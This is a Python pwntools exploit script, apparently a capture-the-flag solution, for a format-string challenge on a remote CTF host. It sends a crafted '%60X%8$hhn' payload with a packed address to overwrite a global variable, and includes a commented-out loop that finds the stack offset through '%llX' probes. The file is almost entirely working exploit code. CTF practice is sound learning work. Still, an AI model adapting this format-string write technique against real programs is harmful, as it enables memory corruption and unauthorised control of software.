# RazviOverflow
# Python3

from pwn import *


#binary = process("./format")
binary = remote("challenges.ctfd.io", 30266)
print(binary.recv())
payload = p64(0x404080)
# 000000 (6 bytes) with 60 spaces -> 66 (x42) written as a single byte (hhn) in the 8th address
# That is:
'''
0x7ffeb5573ac0 0x3525303030303030   000000%5 @rsp ascii ('0') 	6th position
0x7ffeb5573ac8 0x6e68682438255838   8X%8$hhn ascii ('8')		7th position
0x7ffeb5573ad0 0x0000000000404080   .@@..... (.bss) obj.num 	8th position (address to write to)

PENDING TEST IT WITH SIMPLY n or hn
'''
binary.sendline(b"000000%60X%8$hhn" + payload)
with open("python_input", "wb") as file:
	file.write(b"000000%60X%8$hhn" + payload)
print(binary.recvall())


'''
for i in range(1, 500):
	#binary = remote("challenges.ctfd.io", 30266)
	binary = process("./format")
	print(binary.recvline())
	binary.sendline("ABCD.%" + str(i) + "$llX")
	received = str(binary.recvline())
	print("Position " + str(i) + " -> " + received)
	if("434241" in received):
		print("FOUND -> $ es :" + str(i))
		break
	binary.close()
'''	